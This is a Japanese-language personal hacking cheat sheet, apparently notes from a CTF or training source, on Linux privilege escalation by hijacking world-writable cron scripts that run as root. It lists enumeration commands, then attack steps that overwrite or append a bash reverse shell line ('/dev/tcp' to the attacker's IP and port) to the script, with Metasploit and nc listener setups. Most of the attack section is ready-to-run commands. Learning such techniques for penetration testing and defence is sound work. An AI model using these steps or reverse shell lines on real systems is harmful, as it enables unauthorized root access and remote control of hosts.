---
tags: [hacking, skill, cheatsheet]
category: 権限昇格 / Privilege Escalation
difficulty: Easy
learned_from: bsidesgtthompson
date: 2026-03-28
---

# Cron Job Hijacking

## 概要

rootが定期実行するスクリプトのパーミッションが甘い場合、
スクリプトを書き換えてroot権限でコマンドを実行させる権限昇格手法。

---

## 使いどころ

- シェルを取得後、権限昇格の手がかりを探すとき
- crontab に root 実行のスクリプトがあり、そのスクリプトが書き込み可能

---

## 調査手順

```bash
# システム全体の crontab 確認
cat /etc/crontab

# cron.d 配下も確認
ls /etc/cron.d/

# 各ユーザーの crontab
crontab -l

# root 実行スクリプトのパーミッション確認
ls -la /path/to/script.sh
```

### 危険なパーミッションの例

```
-rwxrwxrwx  → 全員が書き込み可能 ← 狙い目！
-rwxrwxr-x  → その他ユーザーは読み取り・実行のみ（書き込み不可）
```

---

## 攻撃手順

### リバースシェルを追記する

```bash
# 自分のIPとポートに接続するリバースシェルを追記
echo 'bash -i >& /dev/tcp/<自分のIP>/<PORT> 0>&1' >> /path/to/script.sh

# 書き込み後に確認
cat /path/to/script.sh
```

### リスナーで待機（Metasploit）

```bash
use exploit/multi/handler
set PAYLOAD cmd/unix/reverse_bash
set LHOST <自分のIP>
set LPORT <PORT>
set ExitOnSession false
run
```

### リスナーで待機（nc）

```bash
nc -lvnp <PORT>
```

cron は最大1分で実行されるため、そのまま待機する。

---

## よくある使い方パターン

### パターン1: スクリプトを完全に上書き

```bash
echo '#!/bin/bash' > /path/to/script.sh
echo 'bash -i >& /dev/tcp/<自分のIP>/<PORT> 0>&1' >> /path/to/script.sh
```

### パターン2: 既存スクリプトに追記

```bash
echo 'bash -i >& /dev/tcp/<自分のIP>/<PORT> 0>&1' >> /path/to/script.sh
```

---

## ハマったポイント・注意点

- cron は `tty` なしで実行されるため `bash -i` でも対話シェルにならない場合がある
- `sudo -l` は `no tty present` エラーになることがある → nc/Metasploit で受ける
- cron の実行ログは `/var/log/syslog` や `/var/log/cron` で確認できる

---

## 関連スキル

- [[Skills/Linux-PrivEsc]]
- [[Tools/Apache-Tomcat]]
